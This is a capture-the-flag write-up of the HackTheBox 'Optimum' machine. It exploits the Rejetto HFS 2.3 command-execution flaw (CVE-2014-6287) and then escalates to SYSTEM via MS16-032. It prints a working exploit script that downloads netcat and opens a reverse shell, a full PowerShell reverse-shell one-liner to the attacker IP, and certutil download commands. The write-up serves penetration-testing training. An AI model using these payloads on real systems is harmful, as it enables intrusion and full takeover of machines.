# Optimum

## Introduction

Welcome to my another writeup! In this HackTheBox [Optimum](https://app.hackthebox.com/machines/Optimum) machine, you'll learn: Exploiting Rejetto HTTP File Server (HFS) 2.3.x, Kernel Exploit (KE), and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: kostas to NT AUTHORITY\SYSTEM](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Optimum/images/Optimum.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:34:41(HKT)]
└> export RHOSTS=10.10.10.8            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:34:46(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:35:26(HKT)]
└> sudo nmap -sU $RHOSTS 
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, we have 1 port is opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80/TCP            | HttpFileServer httpd 2.3      |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:36:40(HKT)]
└> echo "$RHOSTS optimum.htb" | sudo tee -a /etc/hosts
10.10.10.8 optimum.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Optimum/images/Pasted%20image%2020230728113658.png)

As you can see, the web application is using [HttpFileServer 2.3](http://www.rejetto.com/hfs/), which is the **Http File Server (HFS) made by Rejetto**.

## Initial Foothold

**Since we found the web application is using Rejetto Http File Server 2.3, we can search for known vulnerability exploits from the offline version of Exploit-DB: `searchsploit`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:38:25(HKT)]
└> searchsploit Rejetto
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploi | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities    | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload       | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)  | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)  | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execu | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)          | windows/webapps/49125.py
--------------------------------------------------------------------- ---------------------------------
[...]
```

As you can see, "Rejetto HTTP File Server (HFS) 2.3.x" is vulnerable to Remote Code/Command Execution (RCE).

**Let's mirror the second one, `39161.py`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:38:37(HKT)]
└> searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /home/siunam/ctf/htb/Machines/Optimum/39161.py
```

After that, we can read through all the exploit code.

**39161.py:**
```python
[...]
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux.

#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
#          You may need to run it multiple times for success!
[...]
```

Upon researching the CVE ID, we know that:

> HFS versions 2.3, 2.3a, and 2.3b are vulnerable to remote command execution due to a regular expression in `parserLib.pas` that fails to handle null bytes. Commands that follow a null byte in the search string are executed on the host system. As an example, the following search submitted to a vulnerable HFS instance launches calculator on the host Microsoft Windows system.
>  
> - `http://<vulnerable instance>/?search==%00{.exec|calc.}`
>  
> From [https://vk9-sec.com/hfs-code-execution-cve-2014-6287/](https://vk9-sec.com/hfs-code-execution-cve-2014-6287/)

That being said, we can execute arbitrary commands via `<null_byte>{.exec|<arbitrary_command>.}`.

**In the `39161.py` exploit Python script, it's executing arbitrary commands to upload a VBS script, and then execute it:**
```python
try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
```

The VBS script will then upload netcat (`nc.exe`) to the target machine from our attacker web server, and execute the netcat reverse shell payload to connect to our attacker's netcat listening port.

Armed with above information, let's fire it up!

- **Change `ip_addr` to our attacker machine's IP address:**

```python
ip_addr = "10.10.14.8" #local IP address
local_port = "443" # Local Port number
```

- **Setup a web server (i.e: Python's `http.server` module) to host the netcat binary (64-bit):**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:41:41(HKT)]
└> file /opt/static-binaries/binaries/windows/x64/nc.exe
/opt/static-binaries/binaries/windows/x64/nc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:41:49(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/windows/x64/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- **Setup a netcat listener on port 443:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:39:44(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
```

- **Run the exploit few times:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:42:11(HKT)]
└> python2 39161.py optimum.htb 80
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:42:15(HKT)]
└> python2 39161.py optimum.htb 80
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|11:39:44(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49162
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami && ipconfig /all
whoami && ipconfig /all
optimum\kostas

Windows IP Configuration

   Host Name . . . . . . . . . . . . : optimum
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-C7-7F
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.8(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
[...]
```

I'm user `kostas` on host `optimum`!

**user.txt:**
```shell
C:\Users\kostas\Desktop>type user.txt
{Redacted}
```

## Privilege Escalation

### kostas to NT AUTHORITY\SYSTEM

After gaining initial foothold, we can **enumerate the system and escalate our privilege to `Administrator` or `NT AUTHORITY\SYSTEM`.**

**Local users:**
```shell
C:\Users\kostas\Desktop>net user
[...]
-------------------------------------------------------------------------------
Administrator            Guest                    kostas                   
```

No other accounts other than `kostas` and default accounts.

**System information:**
```shell
C:\Users\kostas\Desktop>systeminfo
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
[...]
System Type:               x64-based PC
```

Hmm... This Windows machine is quite old...

- Windows version: **Windows Server 2012 R2 Build 9600**

Now, we can use [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find Kernel Exploits (KEs).

- **Copy the output of `systeminfo` to our attacker machine:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:08:15(HKT)]
└> cat << EOF > systeminfo.txt
then> >....                                                                                            
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
then> EOF
```

- **Get the file that contains the Microsoft security bulletin database:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:09:01(HKT)]
└> python2 /opt/windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2023-07-28-mssb.xls
[*] done
```

- **Run `windows-exploit-suggester.py`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:09:42(HKT)]
└> python2 /opt/windows-exploit-suggester.py --database 2023-07-28-mssb.xls --systeminfo systeminfo.txt
[...]
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[...]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[...]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[...]
```

> After trying different KEs, I found that **MS16-032** KE works.

**According to [this blog post](https://www.puckiestyle.nl/windows-privilege-escalation/), we can escalate our privilege to SYSTEM via:**

- **Download the PowerShell exploit script:** (From [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032))

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:36:07(HKT)]
└> wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-032/MS16-032.ps1
[...]
```

- **Modify the exploit:**

Since we're inside a limited shell, we can't escalate our privilege in the default version of the MS16-032 script, as **it'll create a pop-up `cmd.exe` window** on the target machine, which we can't access that window because we're not in GUI (Graphical User Interface) mode.

To solve this problem, we need to modify the exploit script to send a reverse shell payload instead of a pop-up `cmd.exe` window.

**Go to line 330, copy and paste the following PowerShell code:**
```powershell
        # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
		# $CallResult = [Advapi32]::CreateProcessWithLogonW(
		# 	"user", "domain", "pass",
		# 	0x00000002, "C:\Windows\System32\cmd.exe", "",
		# 	0x00000004, $null, $GetCurrentPath,
		# 	[ref]$StartupInfo, [ref]$ProcessInfo)

		# Modified to create a Powershell reverse shell 
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, 
			'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
			'-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.8\",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
```

> Note: Remember to change `New-Object System.Net.Sockets.TCPClient(\"10.10.14.8\",53)` to your's attacker machine's IP address.

- **Transfer the PowerShell exploit script to the target machine:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:37:51(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
C:\Users\kostas\Desktop>certutil -urlcache -split -f http://10.10.14.8/MS16-032.ps1
[...]
```

- **Setup a netcat listener on port that you just set in the modified exploit script:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:37:47(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
```

- **Run the exploit:**

```shell
C:\Users\kostas\Desktop>powershell -ExecutionPolicy ByPass -command "& { . C:\Users\kostas\Desktop\MS16-032.ps1; Invoke-MS16-032 }"
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1388

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1384
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Optimum)-[2023.07.28|12:37:47(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49212

PS C:\Users\kostas\Desktop^> whoami; ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : optimum
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-C7-7F
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.8(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
[...]
```

I'm `NT AUTHORITY\SYSTEM`! :D

## Rooted

**root.txt:**
```shell
PS C:\Users\Administrator\Desktop> type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Optimum/images/Pasted%20image%2020230728124139.png)

## Conclusion

What we've learned:

1. Exploiting Rejetto HTTP File Server (HFS) 2.3.x
2. Enumerating System Information
3. Finding Kernel Exploits Via [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
4. Vertical Privilege Escalation Via Kernel Exploit (MS16-032)